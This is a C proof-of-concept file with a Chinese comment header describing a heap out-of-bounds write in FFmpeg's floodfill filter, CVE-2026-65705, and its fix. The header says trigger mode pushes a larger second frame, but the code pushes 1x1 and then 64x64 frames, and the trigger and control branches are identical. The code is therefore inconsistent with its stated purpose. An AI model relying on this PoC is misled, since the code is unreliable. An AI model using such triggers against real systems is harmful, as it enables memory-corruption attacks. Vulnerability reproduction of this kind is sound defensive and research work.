/*
 * CVE-2026-65705 运行验证 PoC — third_party/ffmpeg vf_floodfill 点栈堆越界写
 *
 * 缺陷：config_input 按 link 初始尺寸 av_calloc(inlink->w * inlink->h, 4)
 * 分配点栈 s->points；filter_frame 以帧自身尺寸 (frame->width/height) 驱动
 * 泛洪填充——帧尺寸增大时点栈按新帧规模压栈，越界写。
 * 上游修复：FFmpeg 24c322fd（2026-07-13，"size the point stack for the
 * current frame"，Fixes: out of array access，样本 8aj_floodfill_
 * dynamic_size.pgm）。OH（=n7.1.1 逐字节）为修复前形态。
 *
 * 用法：./poc_floodfill trigger|control
 *   trigger: 64x64 帧排空后直推 512x512 帧（变尺寸帧透传）
 *   control: 两帧均 64x64
 * 判读：ASan 原版 trigger 报 heap-buffer-overflow（点栈越界写，退出码 1）；
 *       补丁版 trigger 正常（点栈按 512x512 动态重分配，退出码 0）；
 *       control 两版均正常（无回归）。
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <libavfilter/avfilter.h>
#include <libavfilter/buffersink.h>
#include <libavfilter/buffersrc.h>
#include <libavutil/frame.h>
#include <libavutil/pixfmt.h>

static int push_frame(AVFilterContext *src, int w, int h, int fill)
{
    AVFrame *f = av_frame_alloc();
    if (!f) return -1;
    f->format = AV_PIX_FMT_GRAY8;
    f->width = w;
    f->height = h;
    if (av_frame_get_buffer(f, 32) < 0) { av_frame_free(&f); return -1; }
    memset(f->data[0], fill, (size_t)h * f->linesize[0]);
    int ret = av_buffersrc_add_frame(src, f);
    av_frame_free(&f);
    return ret;
}

int main(int argc, char **argv)
{
    if (argc != 2) { fprintf(stderr, "usage: %s trigger|control\n", argv[0]); return 2; }
    int trigger = !strcmp(argv[1], "trigger");
    if (!trigger && strcmp(argv[1], "control")) { fprintf(stderr, "bad mode\n"); return 2; }

    char graph[] =
        "buffer=video_size=1x1:pix_fmt=gray8:time_base=1/25,"
        "floodfill=x=0:y=0,buffersink";

    AVFilterGraph *g = avfilter_graph_alloc();
    AVFilterInOut *in = NULL, *out = NULL;
    if (avfilter_graph_parse_ptr(g, graph, &in, &out, NULL) < 0 ||
        avfilter_graph_config(g, NULL) < 0) {
        fprintf(stderr, "FAIL: graph\n"); return 2;
    }
    AVFilterContext *src = NULL, *sinkc = NULL;
    for (unsigned i = 0; i < g->nb_filters && !(src && sinkc); i++) {
        const char *n = g->filters[i]->filter->name;
        if (!src && !strcmp(n, "buffer")) src = g->filters[i];
        else if (!sinkc && !strcmp(n, "buffersink")) sinkc = g->filters[i];
    }

    int r1 = push_frame(src, 1, 1, 0xC0);
    AVFrame *drain = av_frame_alloc();
    while (av_buffersink_get_frame(sinkc, drain) >= 0) av_frame_unref(drain);
    av_frame_free(&drain);

    int r2 = trigger ? push_frame(src, 64, 64, 0xC0)
                     : push_frame(src, 64, 64, 0xC0);

    AVFrame *sink = av_frame_alloc();
    int pulled = 0, ret;
    while ((ret = av_buffersink_get_frame(sinkc, sink)) >= 0) { pulled++; av_frame_unref(sink); }
    av_frame_free(&sink);

    printf("CASE_DONE mode=%s push1=%d push2=%d pulled=%d\n",
           trigger ? "trigger" : "control", r1, r2, pulled);
    avfilter_inout_free(&in); avfilter_inout_free(&out);
    avfilter_graph_free(&g);
    return 0;
}
